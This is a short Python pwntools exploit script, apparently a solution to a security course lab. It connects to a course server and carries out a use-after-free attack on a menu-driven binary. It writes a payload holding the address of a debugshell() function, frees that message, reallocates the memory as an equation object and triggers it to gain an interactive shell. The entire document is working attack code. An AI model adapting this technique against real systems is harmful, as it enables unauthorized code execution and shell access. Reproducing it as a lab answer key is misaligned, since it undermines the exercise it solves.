''' Script Module Importing '''
from pwn import *

''' Constant Initializing '''
TARGET_ADDR = 0x401371                      # Address to debugshell()

''' Establish Connection '''
p = remote("csc748.hostbin.org", 7062)      # Test Script Against Server
# p = process("./6-2_lab.bin")              # Test Script Locally
# p = gdb.debug("./6-2_lab.bin")            # Debug with GDB


''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
'''       Input Target Address        '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''

''' Display Options Menu '''
prog_menu = p.readuntil(b'=\n\n')           # Read in Options Menu
prog_prompt = p.readuntil(b'Choice: ')      # Wait for Program Prompt
print("\n", prog_menu.decode('utf-8'))      # Display Options Menu

''' Allocate Memory '''
p.sendline(b"5")                                            # Select Option (5): Draft New Message
print(f"[*] Selecting Option (5): Draft New Message\n")     # Display Exploit Progress

''' Deliver Target Address Payload '''
prog_prompt = p.readuntil(b'text: ')                        # Wait for Program Prompt
payload = b"A"*8 + p32(TARGET_ADDR)                         # Payload Format: buffer + debugshell() address
p.sendline(payload)
print(f"[*] Sending Payload: Buffer Fill +"
      f" {hex(TARGET_ADDR)}\n")                             # Display Exploit Progress

''' Free Memory '''
prog_prompt = p.readuntil(b'Choice: ')                      # Read in Options Menu
p.sendline(b"7")                                            # Select Option (7): Delete Message
print(f"[*] Selecting Option (7): Delete Message\n")        # Display Exploit Progress

''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
'''       Call Target Address       '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''

''' Reallocate Memory '''
prog_prompt = p.readuntil(b'Choice: ')                      # Read in Options Menu
p.sendline(b"1")                                            # Select Option (1): Create an Equation
print(f"[*] Selecting Option (1): Create an Equation\n")    # Display Exploit Progress


''' Call debugshell() Address  '''
prog_prompt = p.readuntil(b'Choice: ')                      # Read in Options Menu

p.sendline(b"4")                                            # Select Option (4): Solve Equation
print(f"[*] Selecting Option (4): Solve Equation\n")        # Display Exploit Progress


''' ' ' ' ' '  ' ' ' ' ' '''
''' Maintain Persistence '''
''' ' ' ' ' '  ' ' ' ' ' '''
p.interactive()                                             # Start Interactive Session
